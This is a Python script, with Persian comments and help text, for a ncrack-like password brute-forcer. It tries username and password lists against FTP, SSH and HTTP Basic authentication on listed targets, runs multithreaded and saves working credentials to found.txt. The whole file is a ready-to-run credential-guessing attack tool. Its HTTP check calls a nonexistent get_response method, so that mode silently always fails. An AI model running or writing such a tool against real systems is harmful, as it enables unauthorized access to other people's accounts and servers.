#!/usr/bin/env python3
# mini-ncrack - مشابه ncrack با سوییچ
# مثال:
# python mini_ncrack.py 192.168.1.10 -p 21,22,80 --user admin -P pass.txt -T 4 -v
# python mini_ncrack.py -iL targets.txt -p ftp:21,ssh:22 -U users.txt -P pass.txt
import argparse, socket, ftplib, threading, queue, sys, base64, http.client

found_event = threading.Event()
work_q = queue.Queue()

def try_ftp(host, port, user, pw, timeout):
    try:
        f = ftplib.FTP()
        f.connect(host, port, timeout=timeout)
        f.login(user, pw)
        f.quit()
        return True
    except: return False

def try_http(host, port, path, user, pw, use_ssl, timeout):
    try:
        auth = base64.b64encode(f"{user}:{pw}".encode()).decode()
        cls = http.client.HTTPSConnection if use_ssl else http.client.HTTPConnection
        c = cls(host, port, timeout=timeout)
        c.request("GET", path, headers={"Authorization": f"Basic {auth}"})
        r = c.get_response(); r.read(); c.close()
        return r.status != 401
    except: return False

def try_ssh(host, port, user, pw, timeout):
    try: import paramiko
    except ImportError:
        print("pip install paramiko"); sys.exit(1)
    try:
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(host, port=port, username=user, password=pw, timeout=timeout, allow_agent=False, look_for_keys=False, banner_timeout=timeout)
        c.close(); return True
    except: return False

def worker(cfg):
    while not work_q.empty() and not found_event.is_set():
        try: host, port, svc, user, pw = work_q.get_nowait()
        except: break
        ok = False
        if svc=="ftp": ok = try_ftp(host, port, user, pw, cfg["timeout"])
        elif svc=="ssh": ok = try_ssh(host, port, user, pw, cfg["timeout"])
        elif svc=="http": ok = try_http(host, port, cfg["path"], user, pw, cfg["ssl"], cfg["timeout"])
        if ok:
            print(f"\n[+] FOUND {host}:{port}/{svc} -> {user}:{pw}")
            open("found.txt","a",encoding="utf-8").write(f"{host}:{port}/{svc} {user}:{pw}\n")
            if cfg["stop"]: found_event.set()
        else:
            if cfg["verbose"]: print(f"[-] {host}:{port}/{svc} {user}:{pw} failed", flush=True)
        work_q.task_done()

def load(f):
    with open(f, encoding="utf-8", errors="ignore") as fh:
        return [l.strip() for l in fh if l.strip()]

def parse_ports(s):
    # فرمت: 21,22,80 یا ftp:21,ssh:22,http:80
    out=[]
    for part in s.split(","):
        part=part.strip()
        if not part: continue
        if ":" in part:
            svc, p = part.split(":"); out.append((svc.lower(), int(p)))
        else:
            p=int(part)
            svc={21:"ftp",22:"ssh",80:"http",443:"http"}.get(p,"ftp")
            out.append((svc,p))
    return out

def main():
    ap = argparse.ArgumentParser(prog="mini-ncrack", description="mini ncrack clone")
    ap.add_argument("target", nargs="?", help="آی‌پی هدف")
    ap.add_argument("-iL", dest="infile", default="", help="فایل تارگت‌ها")
    ap.add_argument("-p", dest="ports", default="21", help="پورت‌ها: 21,22 یا ftp:21,ssh:22")
    ap.add_argument("--user", default="", help="تک یوزر")
    ap.add_argument("-U", dest="userlist", default="", help="فایل یوزرلیست")
    ap.add_argument("-P", dest="passlist", required=True, help="فایل پسوردلیست")
    ap.add_argument("-T", dest="threads", type=int, default=4, help="تعداد نخ‌ها 1-16")
    ap.add_argument("-v", dest="verbose", action="store_true", help="نمایش جزئیات")
    ap.add_argument("--path", default="/", help="مسیر http")
    ap.add_argument("--ssl", action="store_true", help="https")
    ap.add_argument("--timeout", type=int, default=8)
    ap.add_argument("--stop", action="store_true", help="توقف بعد از اولین موفقیت")
    a = ap.parse_args()

    targets=[]
    if a.infile: targets+=load(a.infile)
    if a.target: targets.append(a.target)
    if not targets: print("تارگت بده"); sys.exit(1)

    users = load(a.userlist) if a.userlist else ([a.user] if a.user else ["admin","root"])
    pwds = load(a.passlist)
    ports = parse_ports(a.ports)

    for h in targets:
        for svc,port in ports:
            for u in users:
                for pw in pwds:
                    work_q.put((h,port,svc,u,pw))

    cfg={"timeout":a.timeout,"verbose":a.verbose,"path":a.path,"ssl":a.ssl,"stop":a.stop}
    print(f"[*] targets={targets} ports={ports} total={work_q.qsize()} threads={a.threads}")
    ths=[]
    for _ in range(max(1,min(16,a.threads))):
        t=threading.Thread(target=worker,args=(cfg,),daemon=True); t.start(); ths.append(t)
    for t in ths: t.join()
    if not found_event.is_set(): print("[*] done, nothing found.")

if __name__=="__main__": main()
